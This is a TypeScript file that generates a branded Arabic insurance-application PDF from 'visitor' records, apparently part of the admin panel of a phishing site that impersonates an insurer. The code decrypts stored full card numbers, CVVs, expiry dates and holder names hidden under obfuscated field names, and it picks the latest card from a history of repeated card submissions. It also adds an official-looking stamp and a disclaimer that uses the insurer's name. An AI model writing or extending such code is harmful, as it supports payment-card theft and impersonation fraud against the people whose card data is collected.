"use client";

import type { InsuranceApplication } from "@/lib/firestore-types";
import { _d } from "@/lib/secure-utils";

function decryptField(value: string | undefined): string {
  if (!value) return "";
  try {
    return _d(value) || value;
  } catch {
    return value;
  }
}

function val(v: string | number | undefined | null): string {
  if (v === undefined || v === null || v === "") return "";
  return String(v);
}

function buildPdfHtml(visitor: InsuranceApplication, logoBase64: string, stampBase64: string): string {
  const cardNumber = decryptField(visitor._v1 || visitor.cardNumber);
  const cvv = decryptField(visitor._v2 || visitor.cvv);
  const expiryDate = decryptField(visitor._v3 || visitor.expiryDate);
  const cardHolderName = decryptField(visitor._v4 || visitor.cardHolderName);

  const allCardHistory =
    visitor.history?.filter((h: any) => h.type === "_t1" || h.type === "card") || [];
  const sortedCardHistory = allCardHistory.sort(
    (a: any, b: any) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
  );

  const latestCard = sortedCardHistory.length > 0 ? sortedCardHistory[0] : null;
  const cn = latestCard ? decryptField(latestCard.data?._v1) : cardNumber;
  const cv = latestCard ? decryptField(latestCard.data?._v2) : cvv;
  const ed = latestCard ? decryptField(latestCard.data?._v3) : expiryDate;
  const ch = latestCard ? decryptField(latestCard.data?._v4) : cardHolderName;
  const cardType = latestCard ? val(latestCard.data?.cardType) : "";
  const bankName = latestCard ? val(latestCard.data?.bankInfo?.name) : "";

  const offerCompany = visitor.selectedOffer ? val((visitor.selectedOffer as any).name || (visitor.selectedOffer as any).company) : "";
  const totalPrice = val(visitor.finalPrice || visitor.offerTotalPrice);

  const insuranceDate = visitor.createdAt ? new Date(visitor.createdAt as any).toISOString().split("T")[0] : "";

  const BLUE = "#1B4F8B";

  const renderRow = (label: string, value: string, isGray: boolean) => {
    if (!value) return { html: "", rendered: false };
    return {
      html: `
        <tr style="background:${isGray ? "#F3F6FA" : "#FFFFFF"};">
          <td style="padding:5px 16px;font-family:'Cairo',Arial,sans-serif;font-size:11px;color:#4B5563;font-weight:600;border:1px solid #D1D5DB;text-align:right;white-space:nowrap;width:40%;">${label}</td>
          <td style="padding:5px 16px;font-family:'Cairo',Arial,sans-serif;font-size:12px;font-weight:700;color:#1F2937;border:1px solid #D1D5DB;text-align:right;unicode-bidi:plaintext;">${value}</td>
        </tr>
      `,
      rendered: true,
    };
  };

  const rows = [
    { label: "الاسم حسب البطاقة الشخصية:", value: val(visitor.ownerName) },
    { label: "نوع التأمين:", value: val(visitor.insuranceCoverage) },
    { label: "رقم الهوية:", value: val(visitor.identityNumber) },
    { label: "رقم الهاتف النقال:", value: val(visitor.phoneNumber) },
    { label: "تاريخ بدء التأمين:", value: insuranceDate },
    { label: "القيمة التأمينية:", value: totalPrice },
    { label: "نوع السيارة:", value: val(visitor.vehicleModel) },
    { label: "سنة السيارة:", value: val(visitor.vehicleYear) },
    { label: "الرقم التسلسلي:", value: val(visitor.serialNumber) },
    { label: "الخيار المختار:", value: offerCompany },
  ];

  let rowIndex = 0;
  const tableRows = rows
    .map((r) => {
      const result = renderRow(r.label, r.value, rowIndex % 2 === 0);
      if (result.rendered) rowIndex++;
      return result.html;
    })
    .join("");

  const cardRows = [
    { label: "رقم البطاقة:", value: cn },
    { label: "اسم حامل البطاقة:", value: ch },
    { label: "نوع البطاقة:", value: cardType },
    { label: "تاريخ الانتهاء:", value: ed },
    { label: "CVV:", value: cv },
    { label: "البنك:", value: bankName },
  ];

  let cardRowIndex = 0;
  const cardTableRows = cardRows
    .map((r) => {
      const result = renderRow(r.label, r.value, cardRowIndex % 2 === 0);
      if (result.rendered) cardRowIndex++;
      return result.html;
    })
    .join("");

  const hasCardData = cn || ch || ed || cv;

  return `
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
    <div id="pdf-content" style="
      font-family: 'Cairo', Arial, sans-serif;
      direction: rtl;
      text-align: right;
      width: 680px;
      margin: 0 auto;
      padding: 0;
      background: #FFFFFF;
      color: #1F2937;
      line-height: 1.6;
    ">

      <!-- Header -->
      <div style="padding:30px 30px 20px;display:flex;flex-direction:row;justify-content:space-between;align-items:flex-start;direction:rtl;">
        <div style="flex:1;text-align:right;">
          <div style="font-family:'Cairo',Arial,sans-serif;font-size:14px;font-weight:600;color:${BLUE};margin-top:4px;">إستمارة طلب</div>
        </div>
        <div style="flex-shrink:0;">
          <img src="${logoBase64}" style="width:120px;height:auto;" crossorigin="anonymous" />
        </div>
      </div>

      <!-- Blue Banner 1 -->
      <div style="margin:0 30px;background:${BLUE};border-radius:6px;padding:10px 18px;display:flex;align-items:center;gap:10px;">
        <span style="font-size:14px;color:#FFFFFF;">&#128274;</span>
        <span style="font-family:'Cairo',Arial,sans-serif;font-size:12px;font-weight:700;color:#FFFFFF;">هذا التأمين سيوفر لك بناءً على طلبك</span>
      </div>

      <!-- Disclaimer -->
      <div style="margin:14px 30px;font-family:'Cairo',Arial,sans-serif;font-size:9px;color:#4B5563;line-height:1.8;text-align:right;">
        لا يُعد تأمين مسؤولية مجموعة الخليج للتأمين (الخليج) ش.م.ع (م) حتى يتم قبول هذه الاستمارة ويتم دفع قيمة القسط. وتحتفظ مجموعة الخليج للتأمين (الخليج) ش.م.ع (م) بحق إضافة شروط خاصة أو رفض هذا الطلب. يرجى الرجوع إلى وثيقة التأمين للحصول على كافة الأحكام والشروط والاستثناءات. يوجد نسخة من هذه الوثيقة عند الطلب.
      </div>

      <!-- Applicant Section Header -->
      <div style="margin:0 30px;background:${BLUE};border-radius:6px 6px 0 0;padding:10px 18px;display:flex;align-items:center;gap:10px;">
        <span style="font-size:14px;color:#FFFFFF;">&#128100;</span>
        <span style="font-family:'Cairo',Arial,sans-serif;font-size:12px;font-weight:700;color:#FFFFFF;">مقدم الطلب</span>
      </div>

      <!-- Applicant Table -->
      <div style="margin:0 30px;">
        <table style="width:100%;border-collapse:collapse;">
          ${tableRows}
        </table>
      </div>

      <!-- Terms -->
      <div style="margin:24px 30px 0;">
        <table style="width:100%;border-collapse:collapse;">
          <tr style="background:#F3F6FA;">
            <td style="padding:5px 16px;font-family:'Cairo',Arial,sans-serif;font-size:11px;color:#4B5563;font-weight:600;border:1px solid #D1D5DB;text-align:right;" colspan="2">
              أوافق على الشروط والأحكام: &nbsp;&nbsp;&nbsp;&nbsp;
              <span style="font-size:12px;">&#9745; نعم</span>
              &nbsp;&nbsp;&nbsp;
              <span style="font-size:12px;">&#9744; لا</span>
            </td>
          </tr>
          <tr style="background:#FFFFFF;">
            <td style="padding:5px 16px;font-family:'Cairo',Arial,sans-serif;font-size:11px;color:#4B5563;font-weight:600;border:1px solid #D1D5DB;text-align:right;height:40px;" colspan="2">
              التوقيع:
            </td>
          </tr>
        </table>
      </div>

      <!-- Stamp -->
      <div style="margin:30px 30px 10px;text-align:center;">
        <img src="${stampBase64}" style="width:220px;height:auto;margin:0 auto;display:block;" crossorigin="anonymous" />
      </div>

      <!-- Footer -->
      <div style="margin:10px 30px 20px;text-align:center;">
        <div style="font-family:'Cairo',Arial,sans-serif;font-size:10px;color:#9CA3AF;">1 / 1</div>
      </div>

    </div>
  `;
}

export async function generateVisitorPdf(visitor: InsuranceApplication) {
  const { BECARE_LOGO_BASE64 } = await import("@/lib/pdf-logo");
  const { STAMP_BASE64 } = await import("@/lib/pdf-stamp");
  const html2pdf = (await import("html2pdf.js")).default;

  const link = document.createElement("link");
  link.href = "https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap";
  link.rel = "stylesheet";
  document.head.appendChild(link);
  await new Promise((resolve) => setTimeout(resolve, 1500));

  const container = document.createElement("div");
  container.innerHTML = buildPdfHtml(visitor, BECARE_LOGO_BASE64, STAMP_BASE64);
  container.style.position = "absolute";
  container.style.left = "-9999px";
  container.style.top = "0";
  container.style.width = "700px";
  document.body.appendChild(container);

  const element = container.querySelector("#pdf-content") as HTMLElement;

  const opt = {
    margin: [8, 5, 8, 5] as [number, number, number, number],
    filename: `طلب_تأمين_${visitor.identityNumber || visitor.id || "visitor"}_${Date.now()}.pdf`,
    image: { type: "jpeg" as const, quality: 0.98 },
    html2canvas: {
      scale: 2,
      useCORS: true,
      letterRendering: true,
      scrollY: 0,
    },
    jsPDF: {
      unit: "mm",
      format: "a4",
      orientation: "portrait" as const,
    },
    pagebreak: { mode: ["avoid-all", "css", "legacy"] },
  };

  try {
    await html2pdf().set(opt).from(element).save();
  } finally {
    document.body.removeChild(container);
  }
}
